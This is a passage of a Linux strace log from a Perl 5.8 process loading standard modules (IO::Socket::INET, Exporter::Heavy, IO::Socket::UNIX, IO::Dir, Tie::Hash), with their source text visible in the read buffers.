my($sock,$arg) = @_;\n    my($lport,$rport,$laddr,$raddr,$proto,$type);\n\n    $arg->{LocalAddr} = $arg->{LocalHost}\n\tif exists $arg->{LocalHost} && !exists $arg->{LocalAddr};\n\n    ($laddr,$lport,$proto) = _sock_info($arg->{LocalAddr},\n\t\t\t\t\t$arg->{LocalPort},\n\t\t\t\t\t$arg->{Proto})\n\t\t\tor return _error($sock, $!, $@);\n\n    $laddr = defined $laddr ? inet_aton($laddr)\n\t\t\t    : INADDR_ANY;\n\n    return _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{LocalAddr},\"\'\")\n\tunless(defined $laddr);\n\n    $arg->{PeerAddr} = $arg->{PeerHost}\n\tif exists $arg->{PeerHost} && !exists $arg->{PeerAddr};\n\n    unless(exists $arg->{Listen}) {\n\t($raddr,$rport,$proto) = _sock_info($arg->{PeerAddr},\n\t\t\t\t\t    $arg->{PeerPort},\n\t\t\t\t\t    $proto)\n\t\t\tor return _error($sock, $!, $@);\n    }\n\n    $proto ||= (getprotobyname(\'tcp\'))[2];\n\n    my $pname = (getprotobynumber($proto))[0];\n    $type = $arg->{Type} || $socket_type{lc $pname};\n\n    my @raddr = ();\n\n    if(defined $raddr) {\n\t@raddr = $sock->_get_addr($raddr, $arg->{MultiHomed});\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless @raddr;\n    }\n\n    while(1) {\n\n\t$sock->socket(AF_INET, $type, $proto) or\n\t    return _error($sock, $!, \"$!\");\n\n        if (defined $arg->{Blocking}) {\n\t    defined $sock->blocking($arg->{Blocking})\n\t\tor return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Reuse} || $arg->{ReuseAddr}) {\n\t    $sock->sockopt(SO_REUSEADDR,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{ReusePort}) {\n\t    $sock->sockopt(SO_REUSEPORT,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Broadcast}) {\n\t\t$sock->sockopt(SO_BROADCAST,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif($lport || ($laddr ne INADDR_ANY) || exists $arg->{Listen}) {\n\t    $sock->bind($lport || 0, $laddr) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif(exists $arg->{Listen}) {\n\t    $sock->listen($arg->{Listen} || 5) or\n\t\treturn _error($sock, $!, \"$!\");\n\t    last;\n\t}\n\n \t# don\'t try to connect unless we\'re given a PeerAddr\n \tlast unless e", 4096) = 4096
10195 07:31:50.976086 stat64("/etc/perl/Exporter/Heavy.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.976102 stat64("/etc/perl/Exporter/Heavy.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.976116 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.976129 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.976143 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.976156 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.976170 stat64("/usr/lib/perl5/Exporter/Heavy.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.976183 stat64("/usr/lib/perl5/Exporter/Heavy.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.976196 stat64("/usr/share/perl5/Exporter/Heavy.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.976208 stat64("/usr/share/perl5/Exporter/Heavy.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.976222 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.976234 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.976248 stat64("/usr/share/perl/5.8/Exporter/Heavy.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.976262 stat64("/usr/share/perl/5.8/Exporter/Heavy.pm", {st_mode=S_IFREG|0644, st_size=6252, ...}) = 0
10195 07:31:50.976283 open("/usr/share/perl/5.8/Exporter/Heavy.pm", O_RDONLY|O_LARGEFILE) = 8
10195 07:31:50.976298 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc56a18) = -1 ENOTTY (Inappropriate ioctl for device)
10195 07:31:50.976322 _llseek(8, 0, [0], SEEK_CUR) = 0
10195 07:31:50.976370 read(8, "package Exporter::Heavy;\n\nuse strict;\nno strict \'refs\';\n\n# On one line so MakeMaker will see it.\nrequire Exporter;  our $VERSION = $Exporter::VERSION;\n$Carp::Internal{\"Exporter::Heavy\"} = 1;\n\n#\n# We go to a lot of trouble not to \'require Carp\' at file scope,\n#  because Carp requires Exporter, and something has to give.\n#\n\nsub _rebuild_cache {\n    my ($pkg, $exports, $cache) = @_;\n    s/^&// foreach @$exports;\n    @{$cache}{@$exports} = (1) x @$exports;\n    my $ok = \\@{\"${pkg}::EXPORT_OK\"};\n    if (@$ok) {\n\ts/^&// foreach @$ok;\n\t@{$cache}{@$ok} = (1) x @$ok;\n    }\n}\n\nsub heavy_export {\n\n    # First make import warnings look like they\'re coming from the \"use\".\n    local $SIG{__WARN__} = sub {\n\tmy $text = shift;\n\tif ($text =~ s/ at \\S*Exporter\\S*.pm line \\d+.*\\n//) {\n\t    require Carp;\n\t    local $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\t    Carp::carp($text);\n\t}\n\telse {\n\t    warn $text;\n\t}\n    };\n    local $SIG{__DIE__} = sub {\n\trequire Carp;\n\tlocal $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\tCarp::croak(\"$_[0]Illegal null symbol in \\@${1}::EXPORT\")\n\t    if $_[0] =~ /^Unable to create sub named \"(.*?)::\"/;\n    };\n\n    my($pkg, $callpkg, @imports) = @_;\n    my($type, $sym, $cache_is_current, $oops);\n    my($exports, $export_cache) = (\\@{\"${pkg}::EXPORT\"},\n                                   $Exporter::Cache{$pkg} ||= {});\n\n    if (@imports) {\n\tif (!%$export_cache) {\n\t    _rebuild_cache ($pkg, $exports, $export_cache);\n\t    $cache_is_current = 1;\n\t}\n\n\tif (grep m{^[/!:]}, @imports) {\n\t    my $tagsref = \\%{\"${pkg}::EXPORT_TAGS\"};\n\t    my $tagdata;\n\t    my %imports;\n\t    my($remove, $spec, @names, @allexports);\n\t    # negated first item implies starting with default set:\n\t    unshift @imports, \':DEFAULT\' if $imports[0] =~ m/^!/;\n\t    foreach $spec (@imports){\n\t\t$remove = $spec =~ s/^!//;\n\n\t\tif ($spec =~ s/^://){\n\t\t    if ($spec eq \'DEFAULT\'){\n\t\t\t@names = @$exports;\n\t\t    }\n\t\t    elsif ($tagdata = $tagsref->{$spec}) {\n\t\t\t@names = @$tagdata;\n\t\t    }\n\t\t    else {\n\t\t\twarn qq[\"$spec\" is not defined in %${pkg}::EXPORT_TAGS];\n\t\t\t++$oops;\n\t\t\tnext;\n\t\t    }\n\t\t}\n\t\telsif ($spec =~ m:^/(.*)/$:){\n\t\t    my $patn = $1;\n\t\t    @allexports = keys %$export_cache unless @allexports; # only do keys once\n\t\t    @names = grep(/$patn/, @allexports); # not anchored by default\n\t\t}\n\t\telse {\n\t\t    @names = ($spec); # is a normal symbol name\n\t\t}\n\n\t\twarn \"Import \".($remove ? \"del\":\"add\").\": @names \"\n\t\t    if $Exporter::Verbose;\n\n\t\tif ($remove) {\n\t\t   foreach $sym (@names) { delete $imports{$sym} } \n\t\t}\n\t\telse {\n\t\t    @imports{@names} = (1) x @names;\n\t\t}\n\t    }\n\t    @imports = keys %imports;\n\t}\n\n        my @carp;\n\tforeach $sym (@imports) {\n\t    if (!$export_cache->{$sym}) {\n\t\tif ($sym =~ m/^\\d/) {\n\t\t    $pkg->VERSION($sym); # inherit from UNIVERSAL\n\t\t    # If the version number was the only thing specified\n\t\t    # then we should act as if nothing was specified:\n\t\t    if (@imports == 1) {\n\t\t\t@imports = @$exports;\n\t\t\tlast;\n\t\t    }\n\t\t    # We need a way to emulate \'use Foo ()\' but still\n\t\t    # allow an easy version check: \"use Foo 1.23, \'\'\";\n\t\t    if (@imports == 2 and !$imports[1]) {\n\t\t\t@imports = ();\n\t\t\tlast;\n\t\t    }\n\t\t} elsif ($sym !~ s/^&// || !$export_cache->{$sym}) {\n\t\t    # Last chance - see if they\'ve updated EXPORT_OK since we\n\t\t    # cached it.\n\n\t\t    unless ($cache_is_current) {\n\t\t\t%$export_cache = ();\n\t\t\t_rebuild_cache ($pkg, $exports, $export_cache);\n\t\t\t$cache_is_current = 1;\n\t\t    }\n\n\t\t    if (!$export_cache->{$sym}) {\n\t\t\t# accumulate the non-exports\n\t\t\tpush @carp,\n\t\t\t  qq[\"$sym\" is not exported by the $pkg module\\n];\n\t\t\t$oops++;\n\t\t    }\n\t\t}\n\t    }\n\t}\n\tif ($oops) {\n\t    require Carp;\n\t    Carp::croak(\"@{carp}Can\'t continue after import errors\");\n\t}\n    }\n    else {\n\t@imports = @$exports;\n    }\n\n    my($fail, $fail_cache) = (\\@{\"${pkg}::EXPORT_FAIL\"},\n                              $Exporter::FailCache{$pkg} ||= {});\n\n    if (@$fail) {\n\tif (!%$fail_cache) {\n\t    # Build cache of symbols. Optimise the lookup by adding\n\t    # barewords twice... both with and without a leading &.\n\t    # (Technique could be applied to $export_cac", 4096) = 4096
10195 07:31:50.977128 read(8, "he at cost of memory)\n\t    my @expanded = map { /^\\w/ ? ($_, \'&\'.$_) : $_ } @$fail;\n\t    warn \"${pkg}::EXPORT_FAIL cached: @expanded\" if $Exporter::Verbose;\n\t    @{$fail_cache}{@expanded} = (1) x @expanded;\n\t}\n\tmy @failed;\n\tforeach $sym (@imports) { push(@failed, $sym) if $fail_cache->{$sym} }\n\tif (@failed) {\n\t    @failed = $pkg->export_fail(@failed);\n\t    foreach $sym (@failed) {\n                require Carp;\n\t\tCarp::carp(qq[\"$sym\" is not implemented by the $pkg module ],\n\t\t\t\"on this architecture\");\n\t    }\n\t    if (@failed) {\n\t\trequire Carp;\n\t\tCarp::croak(\"Can\'t continue after import errors\");\n\t    }\n\t}\n    }\n\n    warn \"Importing into $callpkg from $pkg: \",\n\t\tjoin(\", \",sort @imports) if $Exporter::Verbose;\n\n    foreach $sym (@imports) {\n\t# shortcut for the common case of no type character\n\t(*{\"${callpkg}::$sym\"} = \\&{\"${pkg}::$sym\"}, next)\n\t    unless $sym =~ s/^(\\W)//;\n\t$type = $1;\n\t*{\"${callpkg}::$sym\"} =\n\t    $type eq \'&\' ? \\&{\"${pkg}::$sym\"} :\n\t    $type eq \'$\' ? \\${\"${pkg}::$sym\"} :\n\t    $type eq \'@\' ? \\@{\"${pkg}::$sym\"} :\n\t    $type eq \'%\' ? \\%{\"${pkg}::$sym\"} :\n\t    $type eq \'*\' ?  *{\"${pkg}::$sym\"} :\n\t    do { require Carp; Carp::croak(\"Can\'t export symbol: $type$sym\") };\n    }\n}\n\nsub heavy_export_to_level\n{\n      my $pkg = shift;\n      my $level = shift;\n      (undef) = shift;\t\t\t# XXX redundant arg\n      my $callpkg = caller($level);\n      $pkg->export($callpkg, @_);\n}\n\n# Utility functions\n\nsub _push_tags {\n    my($pkg, $var, $syms) = @_;\n    my @nontag = ();\n    my $export_tags = \\%{\"${pkg}::EXPORT_TAGS\"};\n    push(@{\"${pkg}::$var\"},\n\tmap { $export_tags->{$_} ? @{$export_tags->{$_}} \n                                 : scalar(push(@nontag,$_),$_) }\n\t\t(@$syms) ? @$syms : keys %$export_tags);\n    if (@nontag and $^W) {\n\t# This may change to a die one day\n\trequire Carp;\n\tCarp::carp(join(\", \", @nontag).\" are not tags of $pkg\");\n    }\n}\n\nsub heavy_require_version {\n    my($self, $wanted) = @_;\n    my $pkg = ref $self || $self;\n    return ${pkg}->VERSION($wanted);\n}\n\nsub heavy_export_tags {\n  _push_tags((caller)[0], \"EXPORT\",    \\@_);\n}\n\nsub heavy_export_ok_tags {\n  _push_tags((caller)[0], \"EXPORT_OK\", \\@_);\n}\n\n1;\n", 4096) = 2156
10195 07:31:50.977377 brk(0x829c000)    = 0x829c000
10195 07:31:50.977663 read(8, "", 4096) = 0
10195 07:31:50.977678 close(8)          = 0
10195 07:31:50.978778 read(6, "xists($arg->{PeerAddr});\n \n        $raddr = shift @raddr;\n\n\treturn _error($sock, $EINVAL, \'Cannot determine remote port\')\n\t\tunless($rport || $type == SOCK_DGRAM || $type == SOCK_RAW);\n\n\tlast\n\t    unless($type == SOCK_STREAM || defined $raddr);\n\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless defined $raddr;\n\n#        my $timeout = ${*$sock}{\'io_socket_timeout\'};\n#        my $before = time() if $timeout;\n\n\tundef $@;\n        if ($sock->connect(pack_sockaddr_in($rport, $raddr))) {\n#            ${*$sock}{\'io_socket_timeout\'} = $timeout;\n            return $sock;\n        }\n\n\treturn _error($sock, $!, $@ || \"Timeout\")\n\t    unless @raddr;\n\n#\tif ($timeout) {\n#\t    my $new_timeout = $timeout - (time() - $before);\n#\t    return _error($sock,\n#                         (exists(&Errno::ETIMEDOUT) ? Errno::ETIMEDOUT() : $EINVAL),\n#                         \"Timeout\") if $new_timeout <= 0;\n#\t    ${*$sock}{\'io_socket_timeout\'} = $new_timeout;\n#        }\n\n    }\n\n    $sock;\n}\n\nsub connect {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->connect(NAME) or $sock->connect(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::connect(@_ == 1 ? shift : pack_sockaddr_in(@_));\n}\n\nsub bind {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->bind(NAME) or $sock->bind(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::bind(@_ == 1 ? shift : pack_sockaddr_in(@_))\n}\n\nsub sockaddr {\n    @_ == 1 or croak \'usage: $sock->sockaddr()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub sockport {\n    @_ == 1 or croak \'usage: $sock->sockport()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub sockhost {\n    @_ == 1 or croak \'usage: $sock->sockhost()\';\n    my($sock) = @_;\n    my $addr = $sock->sockaddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\nsub peeraddr {\n    @_ == 1 or croak \'usage: $sock->peeraddr()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub peerport {\n    @_ == 1 or croak \'usage: $sock->peerport()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub peerhost {\n    @_ == 1 or croak \'usage: $sock->peerhost()\';\n    my($sock) = @_;\n    my $addr = $sock->peeraddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\n1;\n\n__END__\n\n", 4096) = 2401
10195 07:31:50.979203 _llseek(6, 6496, [6496], SEEK_SET) = 0
10195 07:31:50.994017 _llseek(6, 0, [6496], SEEK_CUR) = 0
10195 07:31:50.994018 close(6)          = 0
10195 07:31:50.994044 stat64("/etc/perl/IO/Socket/UNIX.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.994061 stat64("/etc/perl/IO/Socket/UNIX.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.994076 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.994090 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.994104 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.994117 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.994131 stat64("/usr/lib/perl5/IO/Socket/UNIX.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.994144 stat64("/usr/lib/perl5/IO/Socket/UNIX.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.994157 stat64("/usr/share/perl5/IO/Socket/UNIX.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.994170 stat64("/usr/share/perl5/IO/Socket/UNIX.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.994183 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.994197 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", {st_mode=S_IFREG|0644, st_size=1387, ...}) = 0
10195 07:31:50.994219 open("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", O_RDONLY|O_LARGEFILE) = 6
10195 07:31:50.994235 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc56ec8) = -1 ENOTTY (Inappropriate ioctl for device)
10195 07:31:50.994246 _llseek(6, 0, [0], SEEK_CUR) = 0
10195 07:31:50.994262 brk(0x82bd000)    = 0x82bd000
10195 07:31:50.994280 read(6, "# IO::Socket::UNIX.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::UNIX;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.22\";\n$VERSION = eval $VERSION;\n\nIO::Socket::UNIX->register_domain( AF_UNIX );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"Peer\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($bport,$cport);\n\n    my $type = $arg->{Type} || SOCK_STREAM;\n\n    $sock->socket(AF_UNIX, $type, 0) or\n\treturn undef;\n\n    if(exists $arg->{Local}) {\n\tmy $addr = sockaddr_un($arg->{Local});\n\t$sock->bind($addr) or\n\t    return undef;\n    }\n    if(exists $arg->{Listen} && $type != SOCK_DGRAM) {\n\t$sock->listen($arg->{Listen} || 5) or\n\t    return undef;\n    }\n    elsif(exists $arg->{Peer}) {\n\tmy $addr = sockaddr_un($arg->{Peer});\n\t$sock->connect($addr) or\n\t    return undef;\n    }\n\n    $sock;\n}\n\nsub hostpath {\n    @_ == 1 or croak \'usage: $sock->hostpath()\';\n    my $n = $_[0]->sockname || return undef;\n    (sockaddr_un($n))[0];\n}\n\nsub peerpath {\n    @_ == 1 or croak \'usage: $sock->peerpath()\';\n    my $n = $_[0]->peername || return undef;\n    (sockaddr_un($n))[0];\n}\n\n1; # Keep require happy\n\n__END__\n\n", 4096) = 1387
10195 07:31:50.995256 _llseek(6, 1386, [1386], SEEK_SET) = 0
10195 07:31:50.995275 _llseek(6, 0, [1386], SEEK_CUR) = 0
10195 07:31:50.995286 close(6)          = 0
10195 07:31:50.995435 stat64("/etc/perl/IO/Dir.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.995453 stat64("/etc/perl/IO/Dir.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.995467 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.995480 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.995499 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.995512 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.995527 stat64("/usr/lib/perl5/IO/Dir.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.995539 stat64("/usr/lib/perl5/IO/Dir.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.995552 stat64("/usr/share/perl5/IO/Dir.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.995564 stat64("/usr/share/perl5/IO/Dir.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.995577 stat64("/usr/lib/perl/5.8/IO/Dir.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.995590 stat64("/usr/lib/perl/5.8/IO/Dir.pm", {st_mode=S_IFREG|0644, st_size=5318, ...}) = 0
10195 07:31:50.995612 open("/usr/lib/perl/5.8/IO/Dir.pm", O_RDONLY|O_LARGEFILE) = 6
10195 07:31:50.995627 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc56ec8) = -1 ENOTTY (Inappropriate ioctl for device)
10195 07:31:50.995639 _llseek(6, 0, [0], SEEK_CUR) = 0
10195 07:31:50.995659 read(6, "# IO::Dir.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Dir;\n\nuse 5.006;\n\nuse strict;\nuse Carp;\nuse Symbol;\nuse Exporter;\nuse IO::File;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Tie::Hash;\nuse File::stat;\nuse File::Spec;\n\n@ISA = qw(Tie::Hash Exporter);\n$VERSION = \"1.05\";\n$VERSION = eval $VERSION;\n@EXPORT_OK = qw(DIR_UNLINK);\n\nsub DIR_UNLINK () { 1 }\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new IO::Dir [DIRNAME]\';\n    my $class = shift;\n    my $dh = gensym;\n    if (@_) {\n\tIO::Dir::open($dh, $_[0])\n\t    or return undef;\n    }\n    bless $dh, $class;\n}\n\nsub DESTROY {\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub open {\n    @_ == 2 or croak \'usage: $dh->open(DIRNAME)\';\n    my ($dh, $dirname) = @_;\n    return undef\n\tunless opendir($dh, $dirname);\n    # a dir name should always have a \":\" in it; assume dirname is\n    # in current directory\n    $dirname = \':\' .  $dirname if ( ($^O eq \'MacOS\') && ($dirname !~ /:/) );\n    ${*$dh}{io_dir_path} = $dirname;\n    1;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $dh->close()\';\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub read {\n    @_ == 1 or croak \'usage: $dh->read()\';\n    my ($dh) = @_;\n    readdir($dh);\n}\n\nsub seek {\n    @_ == 2 or croak \'usage: $dh->seek(POS)\';\n    my ($dh,$pos) = @_;\n    seekdir($dh,$pos);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $dh->tell()\';\n    my ($dh) = @_;\n    telldir($dh);\n}\n\nsub rewind {\n    @_ == 1 or croak \'usage: $dh->rewind()\';\n    my ($dh) = @_;\n    rewinddir($dh);\n}\n\nsub TIEHASH {\n    my($class,$dir,$options) = @_;\n\n    my $dh = $class->new($dir)\n\tor return undef;\n\n    $options ||= 0;\n\n    ${*$dh}{io_dir_unlink} = $options & DIR_UNLINK;\n    $dh;\n}\n\nsub FIRSTKEY {\n    my($dh) = @_;\n    $dh->rewind;\n    scalar $dh->read;\n}\n\nsub NEXTKEY {\n    my($dh) = @_;\n    scalar $dh->read;\n}\n\nsub EXISTS {\n    my($dh,$key) = @_;\n    -e File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n}\n\nsub FETCH {\n    my($dh,$key) = @_;\n    &lstat(File::Spec->catfile(${*$dh}{io_dir_path}, $key));\n}\n\nsub STORE {\n    my($dh,$key,$data) = @_;\n    my($atime,$mtime) = ref($data) ? @$data : ($data,$data);\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n    unless(-e $file) {\n\tmy $io = IO::File->new($file,O_CREAT | O_RDWR);\n\t$io->close if $io;\n    }\n    utime($atime,$mtime, $file);\n}\n\nsub DELETE {\n    my($dh,$key) = @_;\n\n    # Only unlink if unlink-ing is enabled\n    return 0\n\tunless ${*$dh}{io_dir_unlink};\n\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n\n    -d $file\n\t? rmdir($file)\n\t: unlink($file);\n}\n\n1;\n\n__END__\n\n=head1 NAME \n\nIO::Dir - supply object methods for directory handles\n\n=head1 SYNOPSIS\n\n    use IO::Dir;\n    $d = IO::Dir->new(\".\");\n    if (defined $d) {\n        while (defined($_ = $d->read)) { something($_); }\n        $d->rewind;\n        while (defined($_ = $d->read)) { something_else($_); }\n        undef $d;\n    }\n\n    tie %dir, \'IO::Dir\', \".\";\n    foreach (keys %dir) {\n\tprint $_, \" \" , $dir{$_}->size,\"\\n\";\n    }\n\n=head1 DESCRIPTION\n\nThe C<IO::Dir> package provides two interfaces to perl\'s directory reading\nroutines.\n\nThe first interface is an object approach. C<IO::Dir> provides an object\nconstructor and methods, which are just wrappers around perl\'s built in\ndirectory reading routines.\n\n=over 4\n\n=item new ( [ DIRNAME ] )\n\nC<new> is the constructor for C<IO::Dir> objects. It accepts one optional\nargument which,  if given, C<new> will pass to C<open>\n\n=back\n\nThe following methods are wrappers for the directory related functions built\ninto perl (the trailing `dir\' has been removed from the names). See L<perlfunc>\nfor details of these functions.\n\n=over 4\n\n=item open ( DIRNAME )\n\n=item read ()\n\n=item seek ( POS )\n\n=item tell ()\n\n=item rewind ()\n\n=item close ()\n\n=back\n\nC<IO::Dir> also provides an interface to reading directories via a tied\nhash. The tied hash extends the interface beyond just the directory\nreading routines by the use of C<lstat>, from the C<File::stat> package,\nC<unlin", 4096) = 4096
10195 07:31:50.996143 stat64("/etc/perl/Tie/Hash.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.996171 stat64("/etc/perl/Tie/Hash.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.996186 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.996199 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.996213 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.996226 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.996240 stat64("/usr/lib/perl5/Tie/Hash.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.996252 stat64("/usr/lib/perl5/Tie/Hash.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.996266 stat64("/usr/share/perl5/Tie/Hash.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.996278 stat64("/usr/share/perl5/Tie/Hash.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.996291 stat64("/usr/lib/perl/5.8/Tie/Hash.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.996304 stat64("/usr/lib/perl/5.8/Tie/Hash.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.996318 stat64("/usr/share/perl/5.8/Tie/Hash.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.996331 stat64("/usr/share/perl/5.8/Tie/Hash.pm", {st_mode=S_IFREG|0644, st_size=7304, ...}) = 0
10195 07:31:50.996353 open("/usr/share/perl/5.8/Tie/Hash.pm", O_RDONLY|O_LARGEFILE) = 8
10195 07:31:50.996368 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc56a18) = -1 ENOTTY (Inappropriate ioctl for device)
10195 07:31:50.996379 _llseek(8, 0, [0], SEEK_CUR) = 0
10195 07:31:50.996438 read(8, "package Tie::Hash;\n\nour $VERSION = \'1.02\';\n\n=head1 NAME\n\nTie::Hash, Tie::StdHash, Tie::ExtraHash - base class definitions for tied hashes\n\n=head1 SYNOPSIS\n\n    package NewHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::Hash);\n\n    sub DELETE { ... }\t\t# Provides needed method\n    sub CLEAR { ... }\t\t# Overrides inherited method\n\n\n    package NewStdHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::StdHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0]};\n    # TIEHASH should return a reference to the actual storage\n    sub DELETE { ... }\n\n    package NewExtraHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::ExtraHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0][0]};\n    # TIEHASH should return an array reference with the first element being\n    # the reference to the actual storage \n    sub DELETE { \n      